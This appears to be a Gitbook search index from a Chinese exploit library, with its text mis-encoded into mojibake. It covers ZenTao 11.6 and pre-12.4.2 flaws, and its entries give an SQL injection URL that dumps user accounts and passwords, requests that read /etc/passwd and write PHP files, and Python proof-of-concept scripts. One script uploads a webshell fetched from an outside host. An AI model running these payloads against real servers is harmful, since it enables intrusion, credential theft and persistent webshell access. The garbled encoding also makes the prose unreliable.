ÈÄöËøá‰πãÂâçËé∑ÂèñÁöÑmoduleNameÂåÖÂê´ÂØπÂ∫îÁöÑcontrolÁ±ªÊñá‰ª∂Âπ∂ÂÆû‰æãÂåñÔºåÈöèÂêéË∞ÉÁî®setParamsByPathInfoÊñπÊ≥ï‰ªéË∑ØÂæÑ‰∏≠Ëé∑ÂèñÊñπÊ≥ïÂØπÂ∫îÁöÑÂèÇÊï∞ÂÄºÔºåÊúÄÂêéÈÄöËøácall_user_func_arrayÊñπÊ≥ïË∞ÉÁî®ÂØπÂ∫îcontrolÁ±ª‰∏≠ÁöÑÂØπÂ∫îÊñπÊ≥ïÂπ∂ËµãÂÄº„ÄÇ Êàë‰ª¨Êü•Áúãmodule/api/control.phpÊñá‰ª∂‰∏≠ÁöÑgetModelÊñπÊ≥ï ËøôÈáåÈÄöËøácall_user_func_arrayÂáΩÊï∞Ë∞ÉÁî®ÊâÄÊúâÁöÑmodelÊñá‰ª∂ÁöÑÊâÄÊúâÊñπÊ≥ï„ÄÇ $result = call_user_func_array(array(&$module, $methodName), $params); ÂèØ‰ª•ÁúãÂà∞module/api/moudel.php‰∏≠ÁöÑsqlÂáΩÊï∞ public function sql($sql, $keyField = '') { $sql = trim($sql); if(strpos($sql, ';') !== false) $sql = substr($sql, 0, strpos($sql, ';')); a($sql); if(empty($sql)) return ''; if(stripos($sql, 'select ') !== 0) { return $this->lang->api->error->onlySelect; } else { try { $stmt = $this->dao->query($sql); if(empty($keyField)) return $stmt->fetchAll(); $rows = array(); while($row = $stmt->fetch()) $rows[$row->$keyField] = $row; return $rows; } catch(PDOException $e) { return $e->getMessage(); } } } ËøôÈáåÂπ∂Ê≤°ÊúâËøõË°åËøáÊª§ÔºåÂè™‰ΩøÁî®‰∫Ü‰ª£Á†Å$sql=trim($sql)ËøáÊª§‰∫ÜÁ©∫Ê†º Êàë‰ª¨Áúã‰∏Ä‰∏ãËøôÈáåÁöÑË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÈúÄË¶ÅÁöÑÊùÉÈôê ËøôÈáåÂèØ‰ª•ÁúãÂà∞‰ªª‰ΩïÁî®Êà∑ÈÉΩÂèØ‰ª•Ë∞ÉÁî®Ëøô‰∏™Ê®°ÂùóÁöÑÊñπÊ≥ïÔºåÊâÄ‰ª•Êàë‰ª¨Áî®ÂÆÉË∞ÉÁî®sqlÊñπÊ≥ïËøõË°åÊü•ËØ¢(Á©∫Ê†ºËΩ¨Êç¢‰∏∫+,ÁªïËøáËøáÊª§) http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user ÊàêÂäüÊâßË°åsqlËØ≠Âè• ÊºèÊ¥ûÂà©Áî®POC ÁôªÈôÜÂêéËÆøÈóÆ http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Á¶ÖÈÅì 11.6 ÁâàÊú¨‰∏≠ÂØπÁî®Êà∑Êé•Âè£Ë∞ÉÁî®ÊùÉÈôêËøáÊª§‰∏çÂÆåÂñÑÔºåÂØºËá¥Ë∞ÉÁî®Êé•Âè£ÊâßË°åSQLËØ≠Âè•ÂØºËá¥SQLÊ≥®ÂÖ• ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Á¶ÖÈÅì 11.6 ÁéØÂ¢ÉÊê≠Âª∫ ËøôÈáå‰ΩøÁî®dockerÁéØÂ¢ÉÊê≠Âª∫ docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8084 ÊåâÊ≠•È™§ÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ËøôÈáåÈÄ†ÊàêÊºèÊ¥ûÁöÑÂéüÂõ†ÂêåÊ†∑ÊòØË∞ÉÁî®Êé•Âè£ÊùÉÈôêÊó†ÈôêÂà∂ÁöÑÂéüÂõ† Êé•Âè£Âá∫Áé∞ÊºèÊ¥ûÁöÑÂéüÂõ†ÂÖ∑‰ΩìÂèÇËÄÉÂèØ‰ª•Êü•Áúã‰∏ä‰∏ÄÁØá Á¶ÖÈÅì 11.6ÁâàÊú¨ SQLÊ≥®ÂÖ•ÊºèÊ¥û ÂÖ≥‰∫éÊ≠§ÊºèÊ¥ûÁöÑÂÆåÊï¥ÂàÜÊûê Á¨¨‰∏ÄÁßçÊñπÊ≥ï Êü•Áúãmodule/file/moudel.php‰∏ãÁöÑparseCSVÊñπÊ≥ï public function parseCSV($fileName) { $content = file_get_contents($fileName); /* Fix bug #890. */ $content = str_replace(\"\\x82\\x32\", \"\\x10\", $content); $lines = explode(\"\\n\", $content); $col = -1; $row = 0; $data = array(); foreach($lines as $line) { $line = trim($line); $markNum = substr_count($line, '\"') - substr_count($line, '\\\"'); if(substr($line, -1) != ',' and (($markNum % 2 == 1 and $col != -1) or ($markNum % 2 == 0 and substr($line, -2) != ',\"' and $col == -1))) $line .= ','; $line = str_replace(',\"\",', ',,', $line); $line = str_replace(',\"\",', ',,', $line); $line = preg_replace_callback('/(\\\"{2,})(\\,+)/U', array($this, 'removeInterference'), $line); $line = str_replace('\"\"', '\"', $line); /* if only one column then line is the data. */ if(strpos($line, ',') === false and $col == -1) { $data[$row][0] = trim($line, '\"'); } else { /* if col is not -1, then the data of column is not end. */ if($col != -1) { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] .= \"\\n\" . $line; $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); continue; } else { $data[$row][$col] .= \"\\n\" . substr($line, 0, $pos); $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $line = substr($line, $pos + 2); $col++; } } if($col == -1) $col = 0; /* explode cols with delimiter. */ while($line) { /* the cell has '\"', the delimiter is '\",'. */ if($line{0} == '\"') { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] = substr($line, 1); /* if line is not empty, then the data of cell is not end. */ if(strlen($line) >= 1) continue 2; $line = ''; } else { $data[$row][$col] = substr($line, 1, $pos - 1); $line = substr($line, $pos + 2); } $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); } else { /* the delimiter default is ','. */ $pos = strpos($line, ','); /* if line is not delimiter, then line is the data of cell. */ if($pos === false) { $data[$row][$col] = $line; $line = ''; } else { $data[$row][$col] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } } $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $col++; } } $row ++; $col = -1; } return $data; } ËøôÈáåÂèØ‰ª•ÁúãÂà∞‰ª•file‰∏∫Ê®°ÂùóÂêç„ÄÅparseCSV‰∏∫ÊñπÊ≥ïÂêçÂéªË∞ÉÁî®ËØªÂèñÊñá‰ª∂ ËØªÂèñÁöÑÊñá‰ª∂Âêç$filenameÂèÇÊï∞ÂèØÊéßÔºå‰æãÂ¶ÇËØªÂèñ/etc/passwd http://xxx.xxx.xxx.xxx/api-getModel-file-parseCSV-fileName=/etc/passwd [!NOTE] Ê≥®ÊÑè‰ª• .php .txt ÁªìÂ∞æÁöÑ‰ºöË¢´ /framework/base/router.class.php‰∏≠ÁöÑparsePathInfoÊñπÊ≥ï ËøáÊª§ Á¨¨‰∫åÁßçÊñπÊ≥ï Êü•Áúãmodule/api/moudel.php‰∏ãÁöÑgetMethodÊñπÊ≥ï public function getMethod($filePath, $ext = '') { $fileName = dirname($filePath); $className = basename(dirname(dirname($filePath))); if(!class_exists($className)) helper::import($fileName); $methodName = basename($filePath); $method = new ReflectionMethod($className . $ext, $methodName); $data = new stdClass(); $data->startLine = $method->getStartLine(); $data->endLine = $method->getEndLine(); $data->comment = $method->getDocComment(); $data->parameters = $method->getParameters(); $data->className = $className; $data->methodName = $methodName; $data->fileName = $fileName; $data->post = false; $file = file($fileName); for($i = $data->startLine - 1; $i endLine; $i++) { if(strpos($file[$i], '$this->post') or strpos($file[$i], 'fixer::input') or strpos($file[$i], '$_POST')) { $data->post = true; } } return $data; } ËøôÈáå‰∏éÁ¨¨‰∏ÄÁßçÂ§ßÂêåÂ∞èÂºÇÔºåÂè™ÊòØË∞ÉÁî®‰∫Ü‰∏çÂêåÊ®°ÂùóÁöÑÊñπÊ≥ï ÁúãÂà∞$fileName = dirname($filePath);ËøôÊÆµÂàô‰∏∫ËøîÂõûÁöÑÁõÆÂΩïÂêç ÊâÄ‰ª•ËØªÂèñ/etc/passwdÂàôÈúÄË¶ÅÂÜô‰∏∫/etc/passwd/1Êù•ÁªïËøá http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/etc/passwd/1 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥û.html","title":"Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥û","keywords":"","body":"Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Á¶ÖÈÅì 11.6 ÁâàÊú¨‰∏≠ÂØπÁî®Êà∑Êé•Âè£Ë∞ÉÁî®ÊùÉÈôêËøáÊª§‰∏çÂÆåÂñÑÔºåÂØºËá¥Ë∞ÉÁî®Êé•Âè£ÊâßË°åSQLËØ≠Âè•ÂØºËá¥SQLÊ≥®ÂÖ• ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Á¶ÖÈÅì 11.6 ÁéØÂ¢ÉÊê≠Âª∫ ËøôÈáå‰ΩøÁî®dockerÁéØÂ¢ÉÊê≠Âª∫ docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8084 ÊåâÊ≠•È™§ÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ËøôÈáåÈÄ†ÊàêÊºèÊ¥ûÁöÑÂéüÂõ†ÂêåÊ†∑ÊòØË∞ÉÁî®Êé•Âè£ÊùÉÈôêÊó†ÈôêÂà∂ÁöÑÂéüÂõ† Êé•Âè£Âá∫Áé∞ÊºèÊ¥ûÁöÑÂéüÂõ†ÂÖ∑‰ΩìÂèÇËÄÉÂèØ‰ª•Êü•Áúã‰∏ä‰∏ÄÁØá Á¶ÖÈÅì 11.6ÁâàÊú¨ SQLÊ≥®ÂÖ•ÊºèÊ¥û ÂÖ≥‰∫éÊ≠§ÊºèÊ¥ûÁöÑÂÆåÊï¥ÂàÜÊûê Êü•Áúãmodule/api/ediyor/moudel.php‰∏ãÁöÑsaveÊñπÊ≥ï public function save($filePath) { $fileContent = $this->post->fileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) { file_put_contents($filePath, $fileContent); } else { die(js::alert($this->lang->editor->notWritable . $extFilePath)); } } $filePathÂèÇÊï∞Âíå$fileContentÂèÇÊï∞ Êàë‰ª¨ÊòØÂèØÊéßÁöÑ Ë∞ÉÁî®ÊñπÊ≥ïÂæÄ /tmpÂÜôÂÖ•‰∏Ä‰∏™phpinfo() http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php POST:fileContent= Âú®Âà©Áî® Á¶ÖÈÅì 11.6ÁâàÊú¨ ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á¨¨‰∫åÁßçÊñπÊ≥ïÊù•Êñá‰ª∂ÂåÖÂê´ http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 ‰πüÂèØ‰ª•ÂÜôÂÖ•ÁΩëÁ´ôÁõÆÂΩï‰∏≠ ÂÖàËé∑ÂèñÂú∞ÂùÄ http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell POSTÔºöfileContent=');?> ËÆøÈóÆhttp://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 ÂæóÂà∞ÁõÆÂΩï‰∏∫ /app/zentaopma/www ËØ∑Ê±ÇÊîπ‰∏∫ http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell fileContent=');?> ÂÜçÂéªËÆøÈóÆhttp://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1Âàô‰ºöÂÜçÁΩëÁ´ôÁõÆÂΩï‰∏ãÁîüÊàê xxx.php Êñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: zentao version = 11.6 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookieÂ≠óÊÆµ) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] Á¶ÖÈÅìÁâàÊú¨‰∏∫:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] Ëé∑ÂèñÁâàÊú¨Â§±Ë¥• \\033[0m\", e) sys.exit(0) def POC_2(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } data = {\"fileContent\":\"\"} write_url = target_url + \"/api-getModel-editor-save-filePath=/tmp/test\" try: response = requests.post(url=write_url, data=data, headers=headers, timeout=10) print(\"\\033[32m[o] Â∞ùËØïÂÜôÂÖ•phpÊñá‰ª∂... \\033[0m\") except: print(\"\\033[31m[x] ÂÜôÂÖ•phpÊñá‰ª∂Â§±Ë¥• \\033[0m\") sys.exit(0) def POC_3(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } vuln_url = target_url + \"/api-getModel-api-getMethod-filePath=/tmp/test/1\" try: response = requests.get(url=vuln_url, headers=headers, timeout=10) if \"System\" in response.text: print(\"\\033[32m[o] ÊàêÂäüÂÜôÂÖ•Êñá‰ª∂ÔºåÂ≠òÂú®ÊºèÊ¥û, ËÆøÈóÆ {}/api-getModel-api-getMethod-filePath=/tmp/test/1/ Êü•Áúã \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ËØªÂèñphpÊñá‰ª∂Â§±Ë¥• \\033[0m\") except: print(\"\\033[31m[x] ËØªÂèñphpÊñá‰ª∂Â§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, zentaosid) POC_3(target_url, zentaosid) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì Â∞è‰∫é12.4.2 Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CNVD-C-2020-121325.html":{"url":"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì Â∞è‰∫é12.4.2 Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CNVD-C-2020-121325.html","title":"Á¶ÖÈÅì Â∞è‰∫é12.4.2 Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CNVD-C-2020-121325","keywords":"","body":"Á¶ÖÈÅì Â∞è‰∫é12.4.2 Êñá‰ª∂‰∏ä‰º†ÊºèÊ¥û CNVD-C-2020-121325 ÊºèÊ¥ûÊèèËø∞ ÁôæÂ∫¶‰∫ëÂÆâÂÖ®Âõ¢ÈòüÁõëÊµãÂà∞Á¶ÖÈÅìÂÆòÊñπÂèëÂ∏É‰∫ÜÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÁöÑÈ£éÈô©ÈÄöÂëäÔºåËØ•ÊºèÊ¥ûÁºñÂè∑‰∏∫CNVD-C-2020-121325ÔºåÊºèÊ¥ûÂΩ±ÂìçÁ¶ÖÈÅì ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Á¶ÖÈÅì ÁéØÂ¢ÉÊê≠Âª∫ ÁôæÂ∫¶‰∏ã12.4.2ÁöÑÁ¶ÖÈÅìÁéØÂ¢ÉÊåâÊ≠•È™§ÂÆâË£Ö‰∏ãËΩΩÂç≥ÂèØ Á¶ÖÈÅìÂÆòÊñπÁΩëÁ´ô Ë∞ÉÁî®Êé•Âè£Êü•ËØ¢ÁâàÊú¨‰ø°ÊÅØ http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig ÊºèÊ¥ûÂ§çÁé∞ [!NOTE] ÊºèÊ¥ûËß¶ÂèëÈúÄË¶ÅÂêéÂè∞ÊùÉÈôê Ê†πÊçÆÊºèÊ¥ûÊèèËø∞Êü•Áúã‰øÆÊîπÂêéÁöÑ‰ª£Á†ÅÁâáÊÆµ ‰øÆÊîπÂâç public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; return parent::downloadZipPackage($version, $link); } ‰øÆÊîπÂêé public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(!preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; $file = basename($link); $extension = substr($file, strrpos($file, '.') + 1); if(strpos(\",{$this->config->file->allowed},\", \",{$extension},\") === false) return false; return parent::downloadZipPackage($version, $link); } ËøôÈáå‰º†ÂÖ•ÁöÑÂèÇÊï∞‰∏∫ÁâàÊú¨ÂíålinkÂú∞ÂùÄÔºåÁÑ∂Âêébase64Ëß£Á†ÅÔºåÊ≠£ÂàôÂà§Êñ≠ÊòØÂê¶‰∏∫httpÊàñhttpsÂçèËÆÆÔºåËøôÈáåÁöÑÊ≠£ÂàôËøáÊª§Âπ∂‰∏çÂÆåÊï¥ÔºåÊâÄ‰ª•ÂèØ‰ª•ÁªïËøáÁî®‰∫é‰∏ãËΩΩÊÅ∂ÊÑèÊñá‰ª∂ ÂèØ‰ª•Â§ßÂÜôhttpÊàñËØ∑Ê±ÇFTPÊù•ÁªïËøáÊ≠£Âàô Ë∑üËøõ‰∏Ä‰∏ãparent::downloadZipPackageËøô‰∏™ÊñπÊ≥ïÔºåË∑üÁùÄÊù•Âà∞zentao\\module\\client\\model.phpÊñá‰ª∂‰∏≠ public function downloadZipPackage($version, $link) { ignore_user_abort(true); set_time_limit(0); if(empty($version) || empty($link)) return false; $dir = \"data/client/\" . $version . '/'; $link = helper::safe64Decode($link); $file = basename($link); if(!is_dir($this->app->wwwRoot . $dir)) { mkdir($this->app->wwwRoot . $dir, 0755, true); } if(!is_dir($this->app->wwwRoot . $dir)) return false; if(file_exists($this->app->wwwRoot . $dir . $file)) { return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } ob_clean(); ob_end_flush(); $local = fopen($this->app->wwwRoot . $dir . $file, 'w'); $remote = fopen($link, 'rb'); if($remote === false) return false; while(!feof($remote)) { $buffer = fread($remote, 4096); fwrite($local, $buffer); } fclose($local); fclose($remote); return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } ÂèØ‰ª•ÁÆÄÂçïÁúãÂà∞ËøôÈáåËé∑Âèñlink‰º†ÂÖ•ÁöÑÊñá‰ª∂ÂêçÔºåÈÄöËøáfopenÊâìÂºÄËØ•Êñá‰ª∂ÔºåÂÜôÂÖ•Á¶ÖÈÅìÁõÆÂΩïwww/data/client/version‰∏≠ Êü•Áúã‰∏Ä‰∏ãÊúâÊ≤°ÊúâË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÁöÑÂú∞Êñπ ÊâæÂà∞‰∫ÜdownloadÊñπÊ≥ïË∞ÉÁî®‰∫ÜËøô‰∏™ÊºèÊ¥ûÁÇπÔºåÊâÄ‰ª•Êàë‰ª¨Êúâ‰∏§Áßç‰∏ãËΩΩÊÅ∂ÊÑèÊñá‰ª∂ÁöÑÊñπÊ≥ï http://xxx.xxx.xxx.xxx/www/client-download-[$versionÂèÇÊï∞]-[base64Âä†ÂØÜÂêéÁöÑÊÅ∂ÊÑèÊñá‰ª∂Âú∞ÂùÄ].html http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=[$versionÂèÇÊï∞]&link=[base64Âä†ÂØÜÂêéÁöÑÊÅ∂ÊÑèÊñá‰ª∂Âú∞ÂùÄ] È¶ñÂÖàÂÖà‰∏ä‰º†‰∏Ä‰∏™ÊÅ∂ÊÑèÊñá‰ª∂ÔºåÂèØ‰ª•ÊòØFTP‰πüÂèØ‰ª•ÊòØHTTP ‰æãÂ¶ÇÊàë‰∏ä‰º†ÁöÑÊñá‰ª∂URL‰∏∫http://peiqi.tech/SHELL.php http://peiqi.tech/SHELL.php | base64Âä†ÂØÜ HTTP://peiqi.tech/SHELL.php | SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw ËØ∑Ê±ÇÂú∞ÂùÄÂàô‰∏∫ http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw ‰∏ãËΩΩÁöÑÁõÆÂΩïÂú∞ÂùÄ‰∏∫zentaopms\\www\\data\\client\\1 [!NOTE] ÁõÆÂΩï‰∏∫versionÂêçÁß∞ ÊàêÂäü‰∏ä‰º†webshell ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POC‰ΩøÁî®ÈúÄË¶ÅÊã•ÊúâÂêéÂè∞Cookie #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: zentao version >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mShell >>> http://xxx.xxx.xxx.xxx/shell.php(ÊÅ∂ÊÑèÊñá‰ª∂Âú∞ÂùÄ) \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookieÂ≠óÊÆµ) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] Á¶ÖÈÅìÁâàÊú¨‰∏∫:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] Ëé∑ÂèñÁâàÊú¨Â§±Ë¥• \\033[0m\", e) def POC_2(target_url, shell_url, zentaosid): options = shell_url.split(\"://\") if options[0] == \"http\": shell_url = \"HTTP://\" + options[1] elif options[0] == \"ftp\": shell_url = \"ftp://\" + options[1] else: print(\"\\033[31m[x] ËØ∑‰ΩøÁî®Ê≠£Á°ÆÁöÑËØ∑Ê±ÇÂú∞ÂùÄ \\033[0m\") sys.exit(0) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"zentaosid={}\".format(zentaosid) } shell_url_base = str((base64.b64encode(shell_url.encode('utf-8'))),'utf-8') vuln_url = target_url + \"/www/index.php?m=client&f=download&version=test&link={}\".format(shell_url_base) print(\"\\033[32m[o] ËØ∑Ê±ÇÊºèÊ¥ûurlÔºö{}\\033[0m\".format(vuln_url)) try: response = requests.get(url=vuln_url, timeout=20, headers=headers) if \"‰øùÂ≠òÊàêÂäü\" in response.text: print(\"\\033[32m[o] ÊàêÂäüÂÜôÂÖ•WebshellÔºåURLÂú∞ÂùÄ‰∏∫Ôºö{}/www/data/client/test/Webshell_name.php\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÊÅ∂ÊÑèÊñá‰ª∂‰∏ãËΩΩÂ§±Ë¥• \\033[0m\") except: print(\"\\033[31m[x] ÊÅ∂ÊÑèÊñá‰ª∂‰∏ãËΩΩÂ§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) shell_url = str(input(\"\\033[35mShell >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, shell_url, zentaosid) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì Â∞è‰∫é12.4.2 CSRFÊºèÊ¥û CNVD-2020-68552.html":{"url":"book/CMSÊºèÊ¥û/Á¶ÖÈÅìCMS/Á¶ÖÈÅì Â∞è‰∫é12.4.2 CSRFÊºèÊ¥û CNVD-2020-68552.html","title":"Á¶ÖÈÅì Â∞è‰∫é12.4.2 CSRFÊºèÊ¥û CNVD-2020-68552","keywords":"","body":"Á¶ÖÈÅì Â∞è‰∫é12.4.2 CSRFÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂèØ‰ª•ÈíàÂØπÁ¶ÖÈÅìÁöÑÈÉ®ÂàÜÊ®°ÂùóÂà∂ÈÄ†ÊÅ∂ÊÑèURLÂú∞ÂùÄÂèëÈÄÅÁªôÁÆ°ÁêÜÂëòÔºåÂΩìÁÆ°ÁêÜÂëòÁôªÂΩïÊó∂‰ºöÊâßË°åÊ®°ÂùóÁöÑÊÅ∂ÊÑèËØ∑Ê±Ç,ÂèØÁî®‰∫éËøõË°åÈíìÈ±ºËØ∑Ê±Ç ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Á¶ÖÈÅì ÁéØÂ¢ÉÊê≠Âª∫ ÁôæÂ∫¶‰∏ã12.4.2ÁöÑÁ¶ÖÈÅìÁéØÂ¢ÉÊåâÊ≠•È™§ÂÆâË£Ö‰∏ãËΩΩÂç≥ÂèØ 